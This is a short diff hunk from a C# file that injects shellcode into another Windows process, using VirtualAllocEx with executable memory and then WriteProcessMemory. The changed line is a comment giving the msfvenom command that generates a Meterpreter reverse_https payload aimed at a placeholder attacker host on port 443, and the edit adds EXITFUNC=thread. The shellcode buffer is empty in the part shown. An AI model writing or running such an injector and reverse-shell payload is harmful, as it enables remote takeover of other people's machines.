@@ -26,7 +26,7 @@ public class TestClass
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
 
             byte[] buf = new byte[] {
-            	    //sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 -f csharp
+            	    //sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp
                 };
             IntPtr outSize;
             WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
